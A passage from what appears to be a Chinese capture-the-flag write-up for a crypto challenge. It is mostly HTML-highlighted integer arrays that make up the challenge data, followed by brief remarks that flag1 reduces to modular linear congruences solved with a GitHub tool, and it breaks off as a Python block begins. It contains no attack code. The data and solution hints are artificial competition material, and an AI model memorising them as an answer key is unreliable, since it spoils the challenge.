class="number">489</span>, <span class="number">407</span>, <span class="number">204</span>, <span class="number">127</span>, <span class="number">10</span>, <span class="number">302</span>, <span class="number">101</span>, <span class="number">389</span>, <span class="number">113</span>, <span class="number">469</span>, <span class="number">184</span>, <span class="number">249</span>, <span class="number">131</span>, <span class="number">113</span>, <span class="number">18</span>, <span class="number">350</span>, <span class="number">106</span>, <span class="number">486</span>, <span class="number">406</span>, <span class="number">295</span>], [<span class="number">265</span>, <span class="number">425</span>, <span class="number">30</span>, <span class="number">478</span>, <span class="number">471</span>, <span class="number">211</span>, <span class="number">162</span>, <span class="number">323</span>, <span class="number">163</span>, <span class="number">205</span>, <span class="number">187</span>, <span class="number">422</span>, <span class="number">452</span>, <span class="number">226</span>, <span class="number">230</span>, <span class="number">367</span>, <span class="number">478</span>, <span class="number">229</span>, <span class="number">365</span>, <span class="number">395</span>, <span class="number">294</span>], [<span class="number">360</span>, <span class="number">193</span>, <span class="number">180</span>, <span class="number">253</span>, <span class="number">337</span>, <span class="number">453</span>, <span class="number">16</span>, <span class="number">352</span>, <span class="number">243</span>, <span class="number">107</span>, <span class="number">171</span>, <span class="number">46</span>, <span class="number">25</span>, <span class="number">234</span>, <span class="number">46</span>, <span class="number">479</span>, <span class="number">267</span>, <span class="number">267</span>, <span class="number">171</span>, <span class="number">188</span>, <span class="number">127</span>], [<span class="number">379</span>, <span class="number">360</span>, <span class="number">109</span>, <span class="number">360</span>, <span class="number">403</span>, <span class="number">343</span>, <span class="number">75</span>, <span class="number">306</span>, <span class="number">138</span>, <span class="number">40</span>, <span class="number">41</span>, <span class="number">253</span>, <span class="number">428</span>, <span class="number">401</span>, <span class="number">464</span>, <span class="number">495</span>, <span class="number">21</span>, <span class="number">296</span>, <span class="number">319</span>, <span class="number">410</span>, <span class="number">440</span>], [<span class="number">28</span>, <span class="number">209</span>, <span class="number">1</span>, <span class="number">233</span>, <span class="number">458</span>, <span class="number">266</span>, <span class="number">301</span>, <span class="number">359</span>, <span class="number">469</span>, <span class="number">304</span>, <span class="number">264</span>, <span class="number">368</span>, <span class="number">339</span>, <span class="number">25</span>, <span class="number">490</span>, <span class="number">343</span>, <span class="number">404</span>, <span class="number">488</span>, <span class="number">275</span>, <span class="number">262</span>, <span class="number">274</span>], [<span class="number">180</span>, <span class="number">372</span>, <span class="number">133</span>, <span class="number">341</span>, <span class="number">29</span>, <span class="number">352</span>, <span class="number">326</span>, <span class="number">89</span>, <span class="number">323</span>, <span class="number">479</span>, <span class="number">68</span>, <span class="number">76</span>, <span class="number">247</span>, <span class="number">225</span>, <span class="number">159</span>, <span class="number">163</span>, <span class="number">180</span>, <span class="number">160</span>, <span class="number">171</span>, <span class="number">7</span>, <span class="number">322</span>], [<span class="number">322</span>, <span class="number">295</span>, <span class="number">28</span>, <span class="number">467</span>, <span class="number">361</span>, <span class="number">169</span>, <span class="number">190</span>, <span class="number">71</span>, <span class="number">456</span>, <span class="number">140</span>, <span class="number">456</span>, <span class="number">202</span>, <span class="number">295</span>, <span class="number">424</span>, <span class="number">428</span>, <span class="number">18</span>, <span class="number">286</span>, <span class="number">233</span>, <span class="number">470</span>, <span class="number">303</span>, <span class="number">429</span>], [<span class="number">234</span>, <span class="number">37</span>, <span class="number">128</span>, <span class="number">175</span>, <span class="number">282</span>, <span class="number">509</span>, <span class="number">54</span>, <span class="number">186</span>, <span class="number">177</span>, <span class="number">23</span>, <span class="number">348</span>, <span class="number">487</span>, <span class="number">473</span>, <span class="number">377</span>, <span class="number">81</span>, <span class="number">225</span>, <span class="number">154</span>, <span class="number">511</span>, <span class="number">364</span>, <span class="number">120</span>, <span class="number">280</span>], [<span class="number">262</span>, <span class="number">82</span>, <span class="number">383</span>, <span class="number">490</span>, <span class="number">128</span>, <span class="number">448</span>, <span class="number">289</span>, <span class="number">420</span>, <span class="number">239</span>, <span class="number">374</span>, <span class="number">392</span>, <span class="number">149</span>, <span class="number">217</span>, <span class="number">398</span>, <span class="number">441</span>, <span class="number">480</span>, <span class="number">453</span>, <span class="number">503</span>, <span class="number">318</span>, <span class="number">285</span>, <span class="number">418</span>], [<span class="number">0</span>, <span class="number">347</span>, <span class="number">223</span>, <span class="number">381</span>, <span class="number">469</span>, <span class="number">208</span>, <span class="number">424</span>, <span class="number">435</span>, <span class="number">404</span>, <span class="number">64</span>, <span class="number">107</span>, <span class="number">73</span>, <span class="number">490</span>, <span class="number">116</span>, <span class="number">445</span>, <span class="number">392</span>, <span class="number">194</span>, <span class="number">287</span>, <span class="number">66</span>, <span class="number">325</span>, <span class="number">261</span>], [<span class="number">99</span>, <span class="number">26</span>, <span class="number">489</span>, <span class="number">114</span>, <span class="number">3</span>, <span class="number">351</span>, <span class="number">494</span>, <span class="number">174</span>, <span class="number">369</span>, <span class="number">354</span>, <span class="number">379</span>, <span class="number">187</span>, <span class="number">90</span>, <span class="number">202</span>, <span class="number">286</span>, <span class="number">37</span>, <span class="number">48</span>, <span class="number">397</span>, <span class="number">298</span>, <span class="number">65</span>, <span class="number">499</span>], [<span class="number">455</span>, <span class="number">114</span>, <span class="number">349</span>, <span class="number">401</span>, <span class="number">5</span>, <span class="number">139</span>, <span class="number">314</span>, <span class="number">227</span>, <span class="number">134</span>, <span class="number">258</span>, <span class="number">270</span>, <span class="number">135</span>, <span class="number">287</span>, <span class="number">332</span>, <span class="number">298</span>, <span class="number">272</span>, <span class="number">167</span>, <span class="number">43</span>, <span class="number">271</span>, <span class="number">484</span>, <span class="number">177</span>], [<span class="number">448</span>, <span class="number">78</span>, <span class="number">479</span>, <span class="number">324</span>, <span class="number">170</span>, <span class="number">7</span>, <span class="number">230</span>, <span class="number">173</span>, <span class="number">214</span>, <span class="number">65</span>, <span class="number">91</span>, <span class="number">497</span>, <span class="number">68</span>, <span class="number">391</span>, <span class="number">44</span>, <span class="number">205</span>, <span class="number">364</span>, <span class="number">471</span>, <span class="number">460</span>, <span class="number">312</span>, <span class="number">122</span>], [<span class="number">452</span>, <span class="number">360</span>, <span class="number">448</span>, <span class="number">169</span>, <span class="number">240</span>, <span class="number">496</span>, <span class="number">302</span>, <span class="number">3</span>, <span class="number">354</span>, <span class="number">266</span>, <span class="number">46</span>, <span class="number">22</span>, <span class="number">151</span>, <span class="number">498</span>, <span class="number">461</span>, <span class="number">314</span>, <span class="number">169</span>, <span class="number">88</span>, <span class="number">30</span>, <span class="number">487</span>, <span class="number">258</span>], [<span class="number">282</span>, <span class="number">222</span>, <span class="number">260</span>, <span class="number">503</span>, <span class="number">106</span>, <span class="number">420</span>, <span class="number">315</span>, <span class="number">307</span>, <span class="number">202</span>, <span class="number">238</span>, <span class="number">224</span>, <span class="number">329</span>, <span class="number">351</span>, <span class="number">190</span>, <span class="number">137</span>, <span class="number">294</span>, <span class="number">171</span>, <span class="number">309</span>, <span class="number">19</span>, <span class="number">186</span>, <span class="number">391</span>], [<span class="number">69</span>, <span class="number">501</span>, <span class="number">283</span>, <span class="number">96</span>, <span class="number">159</span>, <span class="number">459</span>, <span class="number">437</span>, <span class="number">192</span>, <span class="number">293</span>, <span class="number">479</span>, <span class="number">79</span>, <span class="number">49</span>, <span class="number">299</span>, <span class="number">205</span>, <span class="number">177</span>, <span class="number">360</span>, <span class="number">36</span>, <span class="number">414</span>, <span class="number">118</span>, <span class="number">194</span>, <span class="number">270</span>], [<span class="number">6</span>, <span class="number">419</span>, <span class="number">459</span>, <span class="number">254</span>, <span class="number">97</span>, <span class="number">455</span>, <span class="number">445</span>, <span class="number">239</span>, <span class="number">277</span>, <span class="number">278</span>, <span class="number">226</span>, <span class="number">23</span>, <span class="number">146</span>, <span class="number">151</span>, <span class="number">273</span>, <span class="number">378</span>, <span class="number">141</span>, <span class="number">281</span>, <span class="number">480</span>, <span class="number">388</span>, <span class="number">213</span>], [<span class="number">181</span>, <span class="number">508</span>, <span class="number">347</span>, <span class="number">447</span>, <span class="number">467</span>, <span class="number">351</span>, <span class="number">503</span>, <span class="number">262</span>, <span class="number">375</span>, <span class="number">74</span>, <span class="number">49</span>, <span class="number">48</span>, <span class="number">364</span>, <span class="number">492</span>, <span class="number">400</span>, <span class="number">305</span>, <span class="number">25</span>, <span class="number">207</span>, <span class="number">278</span>, <span class="number">163</span>, <span class="number">11</span>], [<span class="number">320</span>, <span class="number">94</span>, <span class="number">400</span>, <span class="number">15</span>, <span class="number">201</span>, <span class="number">53</span>, <span class="number">130</span>, <span class="number">137</span>, <span class="number">219</span>, <span class="number">57</span>, <span class="number">20</span>, <span class="number">239</span>, <span class="number">467</span>, <span class="number">352</span>, <span class="number">373</span>, <span class="number">395</span>, <span class="number">58</span>, <span class="number">4</span>, <span class="number">446</span>, <span class="number">332</span>, <span class="number">41</span>], [<span class="number">205</span>, <span class="number">385</span>, <span class="number">446</span>, <span class="number">185</span>, <span class="number">470</span>, <span class="number">268</span>, <span class="number">308</span>, <span class="number">461</span>, <span class="number">265</span>, <span class="number">75</span>, <span class="number">75</span>, <span class="number">104</span>, <span class="number">108</span>, <span class="number">14</span>, <span class="number">334</span>, <span class="number">499</span>, <span class="number">207</span>, <span class="number">363</span>, <span class="number">94</span>, <span class="number">505</span>, <span class="number">363</span>], [<span class="number">299</span>, <span class="number">292</span>, <span class="number">112</span>, <span class="number">203</span>, <span class="number">7</span>, <span class="number">240</span>, <span class="number">499</span>, <span class="number">343</span>, <span class="number">396</span>, <span class="number">482</span>, <span class="number">383</span>, <span class="number">61</span>, <span class="number">476</span>, <span class="number">101</span>, <span class="number">187</span>, <span class="number">265</span>, <span class="number">428</span>, <span class="number">53</span>, <span class="number">24</span>, <span class="number">342</span>, <span class="number">201</span>], [<span class="number">421</span>, <span class="number">286</span>, <span class="number">305</span>, <span class="number">79</span>, <span class="number">324</span>, <span class="number">216</span>, <span class="number">163</span>, <span class="number">193</span>, <span class="number">362</span>, <span class="number">57</span>, <span class="number">472</span>, <span class="number">449</span>, <span class="number">169</span>, <span class="number">33</span>, <span class="number">280</span>, <span class="number">202</span>, <span class="number">237</span>, <span class="number">376</span>, <span class="number">382</span>, <span class="number">2</span>, <span class="number">1</span>], [<span class="number">379</span>, <span class="number">33</span>, <span class="number">151</span>, <span class="number">51</span>, <span class="number">353</span>, <span class="number">295</span>, <span class="number">145</span>, <span class="number">220</span>, <span class="number">147</span>, <span class="number">251</span>, <span class="number">90</span>, <span class="number">344</span>, <span class="number">96</span>, <span class="number">31</span>, <span class="number">185</span>, <span class="number">250</span>, <span class="number">270</span>, <span class="number">420</span>, <span class="number">365</span>, <span class="number">373</span>, <span class="number">356</span>], [<span class="number">228</span>, <span class="number">299</span>, <span class="number">87</span>, <span class="number">113</span>, <span class="number">458</span>, <span class="number">52</span>, <span class="number">26</span>, <span class="number">228</span>, <span class="number">294</span>, <span class="number">97</span>, <span class="number">384</span>, <span class="number">493</span>, <span class="number">380</span>, <span class="number">209</span>, <span class="number">257</span>, <span class="number">20</span>, <span class="number">375</span>, <span class="number">2</span>, <span class="number">316</span>, <span class="number">129</span>, <span class="number">492</span>], [<span class="number">479</span>, <span class="number">346</span>, <span class="number">57</span>, <span class="number">488</span>, <span class="number">183</span>, <span class="number">185</span>, <span class="number">18</span>, <span class="number">422</span>, <span class="number">209</span>, <span class="number">318</span>, <span class="number">461</span>, <span class="number">159</span>, <span class="number">469</span>, <span class="number">145</span>, <span class="number">44</span>, <span class="number">58</span>, <span class="number">441</span>, <span class="number">490</span>, <span class="number">510</span>, <span class="number">194</span>, <span class="number">192</span>], [<span class="number">254</span>, <span class="number">398</span>, <span class="number">510</span>, <span class="number">159</span>, <span class="number">371</span>, <span class="number">280</span>, <span class="number">331</span>, <span class="number">23</span>, <span class="number">99</span>, <span class="number">150</span>, <span class="number">175</span>, <span class="number">151</span>, <span class="number">42</span>, <span class="number">473</span>, <span class="number">164</span>, <span class="number">35</span>, <span class="number">97</span>, <span class="number">174</span>, <span class="number">115</span>, <span class="number">24</span>, <span class="number">270</span>], [<span class="number">280</span>, <span class="number">76</span>, <span class="number">254</span>, <span class="number">293</span>, <span class="number">491</span>, <span class="number">76</span>, <span class="number">128</span>, <span class="number">301</span>, <span class="number">240</span>, <span class="number">357</span>, <span class="number">192</span>, <span class="number">372</span>, <span class="number">343</span>, <span class="number">34</span>, <span class="number">386</span>, <span class="number">468</span>, <span class="number">313</span>, <span class="number">41</span>, <span class="number">285</span>, <span class="number">507</span>, <span class="number">282</span>], [<span class="number">271</span>, <span class="number">91</span>, <span class="number">507</span>, <span class="number">16</span>, <span class="number">128</span>, <span class="number">8</span>, <span class="number">326</span>, <span class="number">102</span>, <span class="number">355</span>, <span class="number">371</span>, <span class="number">313</span>, <span class="number">292</span>, <span class="number">433</span>, <span class="number">2</span>, <span class="number">459</span>, <span class="number">14</span>, <span class="number">258</span>, <span class="number">498</span>, <span class="number">146</span>, <span class="number">446</span>, <span class="number">309</span>], [<span class="number">386</span>, <span class="number">88</span>, <span class="number">502</span>, <span class="number">4</span>, <span class="number">399</span>, <span class="number">272</span>, <span class="number">49</span>, <span class="number">69</span>, <span class="number">51</span>, <span class="number">465</span>, <span class="number">291</span>, <span class="number">289</span>, <span class="number">417</span>, <span class="number">271</span>, <span class="number">374</span>, <span class="number">337</span>, <span class="number">46</span>, <span class="number">393</span>, <span class="number">19</span>, <span class="number">429</span>, <span class="number">91</span>], [<span class="number">407</span>, <span class="number">35</span>, <span class="number">337</span>, <span class="number">51</span>, <span class="number">41</span>, <span class="number">460</span>, <span class="number">222</span>, <span class="number">448</span>, <span class="number">499</span>, <span class="number">381</span>, <span class="number">59</span>, <span class="number">468</span>, <span class="number">440</span>, <span class="number">216</span>, <span class="number">86</span>, <span class="number">236</span>, <span class="number">91</span>, <span class="number">18</span>, <span class="number">123</span>, <span class="number">68</span>, <span class="number">145</span>], [<span class="number">384</span>, <span class="number">30</span>, <span class="number">454</span>, <span class="number">419</span>, <span class="number">275</span>, <span class="number">164</span>, <span class="number">72</span>, <span class="number">195</span>, <span class="number">489</span>, <span class="number">458</span>, <span class="number">419</span>, <span class="number">148</span>, <span class="number">269</span>, <span class="number">150</span>, <span class="number">358</span>, <span class="number">188</span>, <span class="number">109</span>, <span class="number">27</span>, <span class="number">42</span>, <span class="number">34</span>, <span class="number">123</span>], [<span class="number">500</span>, <span class="number">184</span>, <span class="number">195</span>, <span class="number">193</span>, <span class="number">68</span>, <span class="number">19</span>, <span class="number">329</span>, <span class="number">511</span>, <span class="number">280</span>, <span class="number">69</span>, <span class="number">113</span>, <span class="number">124</span>, <span class="number">102</span>, <span class="number">274</span>, <span class="number">43</span>, <span class="number">374</span>, <span class="number">408</span>, <span class="number">64</span>, <span class="number">314</span>, <span class="number">309</span>, <span class="number">473</span>], [<span class="number">72</span>, <span class="number">145</span>, <span class="number">242</span>, <span class="number">2</span>, <span class="number">367</span>, <span class="number">371</span>, <span class="number">143</span>, <span class="number">166</span>, <span class="number">325</span>, <span class="number">74</span>, <span class="number">414</span>, <span class="number">94</span>, <span class="number">269</span>, <span class="number">196</span>, <span class="number">124</span>, <span class="number">94</span>, <span class="number">14</span>, <span class="number">351</span>, <span class="number">111</span>, <span class="number">465</span>, <span class="number">503</span>], [<span class="number">70</span>, <span class="number">47</span>, <span class="number">439</span>, <span class="number">170</span>, <span class="number">306</span>, <span class="number">82</span>, <span class="number">233</span>, <span class="number">36</span>, <span class="number">346</span>, <span class="number">234</span>, <span class="number">157</span>, <span class="number">468</span>, <span class="number">83</span>, <span class="number">85</span>, <span class="number">424</span>, <span class="number">157</span>, <span class="number">258</span>, <span class="number">120</span>, <span class="number">270</span>, <span class="number">136</span>, <span class="number">286</span>], [<span class="number">442</span>, <span class="number">173</span>, <span class="number">254</span>, <span class="number">271</span>, <span class="number">420</span>, <span class="number">507</span>, <span class="number">297</span>, <span class="number">473</span>, <span class="number">296</span>, <span class="number">511</span>, <span class="number">98</span>, <span class="number">133</span>, <span class="number">37</span>, <span class="number">498</span>, <span class="number">468</span>, <span class="number">17</span>, <span class="number">260</span>, <span class="number">318</span>, <span class="number">168</span>, <span class="number">490</span>, <span class="number">124</span>], [<span class="number">50</span>, <span class="number">35</span>, <span class="number">252</span>, <span class="number">472</span>, <span class="number">406</span>, <span class="number">400</span>, <span class="number">439</span>, <span class="number">89</span>, <span class="number">309</span>, <span class="number">393</span>, <span class="number">332</span>, <span class="number">324</span>, <span class="number">260</span>, <span class="number">215</span>, <span class="number">8</span>, <span class="number">322</span>, <span class="number">357</span>, <span class="number">252</span>, <span class="number">124</span>, <span class="number">358</span>, <span class="number">457</span>], [<span class="number">93</span>, <span class="number">102</span>, <span class="number">478</span>, <span class="number">224</span>, <span class="number">428</span>, <span class="number">10</span>, <span class="number">238</span>, <span class="number">368</span>, <span class="number">113</span>, <span class="number">502</span>, <span class="number">148</span>, <span class="number">7</span>, <span class="number">395</span>, <span class="number">97</span>, <span class="number">73</span>, <span class="number">306</span>, <span class="number">40</span>, <span class="number">395</span>, <span class="number">9</span>, <span class="number">254</span>, <span class="number">319</span>], [<span class="number">282</span>, <span class="number">277</span>, <span class="number">295</span>, <span class="number">425</span>, <span class="number">59</span>, <span class="number">21</span>, <span class="number">136</span>, <span class="number">230</span>, <span class="number">207</span>, <span class="number">1</span>, <span class="number">29</span>, <span class="number">170</span>, <span class="number">14</span>, <span class="number">337</span>, <span class="number">371</span>, <span class="number">437</span>, <span class="number">359</span>, <span class="number">10</span>, <span class="number">100</span>, <span class="number">374</span>, <span class="number">24</span>], [<span class="number">3</span>, <span class="number">270</span>, <span class="number">289</span>, <span class="number">179</span>, <span class="number">434</span>, <span class="number">489</span>, <span class="number">470</span>, <span class="number">343</span>, <span class="number">478</span>, <span class="number">156</span>, <span class="number">177</span>, <span class="number">72</span>, <span class="number">13</span>, <span class="number">266</span>, <span class="number">475</span>, <span class="number">23</span>, <span class="number">148</span>, <span class="number">102</span>, <span class="number">210</span>, <span class="number">270</span>, <span class="number">323</span>], [<span class="number">464</span>, <span class="number">466</span>, <span class="number">277</span>, <span class="number">191</span>, <span class="number">426</span>, <span class="number">20</span>, <span class="number">266</span>, <span class="number">33</span>, <span class="number">41</span>, <span class="number">249</span>, <span class="number">452</span>, <span class="number">475</span>, <span class="number">265</span>, <span class="number">421</span>, <span class="number">282</span>, <span class="number">250</span>, <span class="number">233</span>, <span class="number">287</span>, <span class="number">495</span>, <span class="number">170</span>, <span class="number">300</span>], [<span class="number">379</span>, <span class="number">35</span>, <span class="number">137</span>, <span class="number">106</span>, <span class="number">155</span>, <span class="number">81</span>, <span class="number">154</span>, <span class="number">382</span>, <span class="number">30</span>, <span class="number">237</span>, <span class="number">294</span>, <span class="number">478</span>, <span class="number">321</span>, <span class="number">384</span>, <span class="number">48</span>, <span class="number">111</span>, <span class="number">150</span>, <span class="number">4</span>, <span class="number">454</span>, <span class="number">446</span>, <span class="number">28</span>], [<span class="number">57</span>, <span class="number">355</span>, <span class="number">94</span>, <span class="number">253</span>, <span class="number">297</span>, <span class="number">424</span>, <span class="number">415</span>, <span class="number">480</span>, <span class="number">68</span>, <span class="number">356</span>, <span class="number">415</span>, <span class="number">73</span>, <span class="number">41</span>, <span class="number">171</span>, <span class="number">491</span>, <span class="number">130</span>, <span class="number">92</span>, <span class="number">180</span>, <span class="number">506</span>, <span class="number">326</span>, <span class="number">463</span>], [<span class="number">279</span>, <span class="number">43</span>, <span class="number">202</span>, <span class="number">35</span>, <span class="number">397</span>, <span class="number">257</span>, <span class="number">120</span>, <span class="number">11</span>, <span class="number">231</span>, <span class="number">369</span>, <span class="number">221</span>, <span class="number">332</span>, <span class="number">47</span>, <span class="number">236</span>, <span class="number">58</span>, <span class="number">278</span>, <span class="number">75</span>, <span class="number">117</span>, <span class="number">33</span>, <span class="number">130</span>, <span class="number">358</span>], [<span class="number">142</span>, <span class="number">335</span>, <span class="number">339</span>, <span class="number">112</span>, <span class="number">38</span>, <span class="number">82</span>, <span class="number">426</span>, <span class="number">211</span>, <span class="number">174</span>, <span class="number">389</span>, <span class="number">137</span>, <span class="number">96</span>, <span class="number">431</span>, <span class="number">113</span>, <span class="number">112</span>, <span class="number">500</span>, <span class="number">145</span>, <span class="number">44</span>, <span class="number">313</span>, <span class="number">96</span>, <span class="number">187</span>], [<span class="number">246</span>, <span class="number">211</span>, <span class="number">400</span>, <span class="number">415</span>, <span class="number">294</span>, <span class="number">234</span>, <span class="number">367</span>, <span class="number">46</span>, <span class="number">371</span>, <span class="number">479</span>, <span class="number">412</span>, <span class="number">197</span>, <span class="number">204</span>, <span class="number">498</span>, <span class="number">18</span>, <span class="number">140</span>, <span class="number">67</span>, <span class="number">237</span>, <span class="number">510</span>, <span class="number">457</span>, <span class="number">298</span>], [<span class="number">258</span>, <span class="number">3</span>, <span class="number">136</span>, <span class="number">284</span>, <span class="number">149</span>, <span class="number">161</span>, <span class="number">456</span>, <span class="number">122</span>, <span class="number">114</span>, <span class="number">383</span>, <span class="number">251</span>, <span class="number">240</span>, <span class="number">453</span>, <span class="number">227</span>, <span class="number">330</span>, <span class="number">33</span>, <span class="number">241</span>, <span class="number">160</span>, <span class="number">306</span>, <span class="number">254</span>, <span class="number">409</span>], [<span class="number">391</span>, <span class="number">115</span>, <span class="number">92</span>, <span class="number">102</span>, <span class="number">359</span>, <span class="number">182</span>, <span class="number">489</span>, <span class="number">313</span>, <span class="number">204</span>, <span class="number">275</span>, <span class="number">206</span>, <span class="number">447</span>, <span class="number">436</span>, <span class="number">286</span>, <span class="number">229</span>, <span class="number">377</span>, <span class="number">374</span>, <span class="number">162</span>, <span class="number">22</span>, <span class="number">384</span>, <span class="number">40</span>], [<span class="number">427</span>, <span class="number">491</span>, <span class="number">362</span>, <span class="number">240</span>, <span class="number">358</span>, <span class="number">296</span>, <span class="number">154</span>, <span class="number">178</span>, <span class="number">278</span>, <span class="number">284</span>, <span class="number">324</span>, <span class="number">422</span>, <span class="number">52</span>, <span class="number">295</span>, <span class="number">490</span>, <span class="number">56</span>, <span class="number">39</span>, <span class="number">378</span>, <span class="number">174</span>, <span class="number">202</span>, <span class="number">496</span>], [<span class="number">29</span>, <span class="number">454</span>, <span class="number">436</span>, <span class="number">6</span>, <span class="number">287</span>, <span class="number">82</span>, <span class="number">154</span>, <span class="number">474</span>, <span class="number">92</span>, <span class="number">272</span>, <span class="number">400</span>, <span class="number">238</span>, <span class="number">352</span>, <span class="number">140</span>, <span class="number">386</span>, <span class="number">504</span>, <span class="number">19</span>, <span class="number">32</span>, <span class="number">334</span>, <span class="number">30</span>, <span class="number">450</span>], [<span class="number">469</span>, <span class="number">123</span>, <span class="number">353</span>, <span class="number">422</span>, <span class="number">175</span>, <span class="number">260</span>, <span class="number">294</span>, <span class="number">18</span>, <span class="number">268</span>, <span class="number">479</span>, <span class="number">60</span>, <span class="number">114</span>, <span class="number">456</span>, <span class="number">55</span>, <span class="number">403</span>, <span class="number">446</span>, <span class="number">166</span>, <span class="number">259</span>, <span class="number">294</span>, <span class="number">215</span>, <span class="number">48</span>], [<span class="number">404</span>, <span class="number">187</span>, <span class="number">426</span>, <span class="number">362</span>, <span class="number">296</span>, <span class="number">239</span>, <span class="number">226</span>, <span class="number">416</span>, <span class="number">306</span>, <span class="number">336</span>, <span class="number">1</span>, <span class="number">448</span>, <span class="number">47</span>, <span class="number">403</span>, <span class="number">367</span>, <span class="number">357</span>, <span class="number">501</span>, <span class="number">425</span>, <span class="number">310</span>, <span class="number">41</span>, <span class="number">303</span>], [<span class="number">339</span>, <span class="number">115</span>, <span class="number">478</span>, <span class="number">416</span>, <span class="number">10</span>, <span class="number">90</span>, <span class="number">188</span>, <span class="number">229</span>, <span class="number">217</span>, <span class="number">441</span>, <span class="number">288</span>, <span class="number">152</span>, <span class="number">394</span>, <span class="number">219</span>, <span class="number">422</span>, <span class="number">376</span>, <span class="number">325</span>, <span class="number">375</span>, <span class="number">6</span>, <span class="number">454</span>, <span class="number">238</span>], [<span class="number">226</span>, <span class="number">226</span>, <span class="number">149</span>, <span class="number">107</span>, <span class="number">418</span>, <span class="number">419</span>, <span class="number">209</span>, <span class="number">108</span>, <span class="number">87</span>, <span class="number">127</span>, <span class="number">202</span>, <span class="number">320</span>, <span class="number">179</span>, <span class="number">234</span>, <span class="number">87</span>, <span class="number">335</span>, <span class="number">195</span>, <span class="number">5</span>, <span class="number">273</span>, <span class="number">142</span>, <span class="number">115</span>], [<span class="number">464</span>, <span class="number">177</span>, <span class="number">77</span>, <span class="number">101</span>, <span class="number">76</span>, <span class="number">19</span>, <span class="number">73</span>, <span class="number">397</span>, <span class="number">296</span>, <span class="number">34</span>, <span class="number">360</span>, <span class="number">107</span>, <span class="number">491</span>, <span class="number">460</span>, <span class="number">510</span>, <span class="number">342</span>, <span class="number">198</span>, <span class="number">118</span>, <span class="number">105</span>, <span class="number">337</span>, <span class="number">239</span>], [<span class="number">464</span>, <span class="number">25</span>, <span class="number">191</span>, <span class="number">113</span>, <span class="number">455</span>, <span class="number">129</span>, <span class="number">247</span>, <span class="number">488</span>, <span class="number">303</span>, <span class="number">27</span>, <span class="number">242</span>, <span class="number">423</span>, <span class="number">336</span>, <span class="number">125</span>, <span class="number">283</span>, <span class="number">332</span>, <span class="number">244</span>, <span class="number">372</span>, <span class="number">175</span>, <span class="number">276</span>, <span class="number">49</span>], [<span class="number">211</span>, <span class="number">367</span>, <span class="number">406</span>, <span class="number">314</span>, <span class="number">177</span>, <span class="number">496</span>, <span class="number">320</span>, <span class="number">385</span>, <span class="number">193</span>, <span class="number">51</span>, <span class="number">423</span>, <span class="number">80</span>, <span class="number">258</span>, <span class="number">44</span>, <span class="number">154</span>, <span class="number">362</span>, <span class="number">215</span>, <span class="number">296</span>, <span class="number">260</span>, <span class="number">424</span>, <span class="number">160</span>], [<span class="number">384</span>, <span class="number">161</span>, <span class="number">92</span>, <span class="number">402</span>, <span class="number">414</span>, <span class="number">443</span>, <span class="number">129</span>, <span class="number">279</span>, <span class="number">272</span>, <span class="number">224</span>, <span class="number">294</span>, <span class="number">319</span>, <span class="number">75</span>, <span class="number">169</span>, <span class="number">242</span>, <span class="number">85</span>, <span class="number">315</span>, <span class="number">402</span>, <span class="number">4</span>, <span class="number">268</span>, <span class="number">88</span>]]</span><br><span class="line">[<span class="number">1702</span>, <span class="number">795</span>, <span class="number">740</span>, <span class="number">373</span>, <span class="number">535</span>, <span class="number">1308</span>, <span class="number">1050</span>, <span class="number">502</span>, <span class="number">40</span>, <span class="number">672</span>, <span class="number">1354</span>, <span class="number">1843</span>, <span class="number">515</span>, <span class="number">231</span>, <span class="number">774</span>, <span class="number">65</span>, <span class="number">978</span>, <span class="number">1340</span>, <span class="number">455</span>, <span class="number">2137</span>, <span class="number">733</span>, <span class="number">307</span>, <span class="number">1604</span>, <span class="number">723</span>, <span class="number">1023</span>, <span class="number">1253</span>, <span class="number">275</span>, <span class="number">1817</span>, <span class="number">404</span>, <span class="number">2035</span>, <span class="number">267</span>, <span class="number">1475</span>, <span class="number">14</span>, <span class="number">2127</span>, <span class="number">15</span>, <span class="number">487</span>, <span class="number">317</span>, <span class="number">757</span>, <span class="number">290</span>, <span class="number">541</span>, <span class="number">100</span>, <span class="number">951</span>, <span class="number">2049</span>, <span class="number">1042</span>, <span class="number">1404</span>, <span class="number">1676</span>, <span class="number">655</span>, <span class="number">1460</span>, <span class="number">1532</span>, <span class="number">273</span>, <span class="number">916</span>, <span class="number">1454</span>, <span class="number">1690</span>, <span class="number">1628</span>, <span class="number">1751</span>, <span class="number">1656</span>, <span class="number">139</span>, <span class="number">156</span>, <span class="number">2102</span>, <span class="number">264</span>, <span class="number">243</span>, <span class="number">455</span>, <span class="number">1564</span>, <span class="number">2072</span>]</span><br><span class="line">[<span class="number">884</span>, <span class="number">1584</span>, <span class="number">681</span>, <span class="number">1713</span>, <span class="number">1916</span>, <span class="number">609</span>, <span class="number">1840</span>, <span class="number">177</span>, <span class="number">1723</span>, <span class="number">1049</span>, <span class="number">254</span>, <span class="number">864</span>, <span class="number">1671</span>, <span class="number">121</span>, <span class="number">2021</span>, <span class="number">1353</span>, <span class="number">1290</span>, <span class="number">1891</span>, <span class="number">556</span>, <span class="number">1786</span>, <span class="number">1553</span>, <span class="number">1548</span>, <span class="number">727</span>, <span class="number">1967</span>, <span class="number">1800</span>, <span class="number">422</span>, <span class="number">1559</span>, <span class="number">1290</span>, <span class="number">642</span>, <span class="number">1406</span>, <span class="number">441</span>, <span class="number">1928</span>, <span class="number">395</span>, <span class="number">279</span>, <span class="number">1125</span>, <span class="number">1273</span>, <span class="number">99</span>, <span class="number">1131</span>, <span class="number">395</span>, <span class="number">76</span>, <span class="number">733</span>, <span class="number">416</span>, <span class="number">924</span>, <span class="number">571</span>, <span class="number">506</span>, <span class="number">822</span>, <span class="number">877</span>, <span class="number">887</span>, <span class="number">860</span>, <span class="number">1755</span>, <span class="number">1385</span>, <span class="number">1861</span>, <span class="number">1754</span>, <span class="number">1851</span>, <span class="number">1046</span>, <span class="number">1724</span>, <span class="number">1866</span>, <span class="number">1427</span>, <span class="number">378</span>, <span class="number">351</span>, <span class="number">146</span>, <span class="number">1367</span>, <span class="number">756</span>, <span class="number">505</span>]</span><br></pre></td></tr></table></figure><p>la佬一🩸，好奇心拉满，于是开始研究起来了</p><p>化简，易得解flag1要点：<strong>单模多元线性同余方程</strong></p><p>就着csdn现学，效率过低🤔</p><p>放弃之际，在github上搜到了<a href="https://github.com/55-AA/mod_equations">优秀的代码</a></p><p>处理好数据，解方程，得到前半段flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span 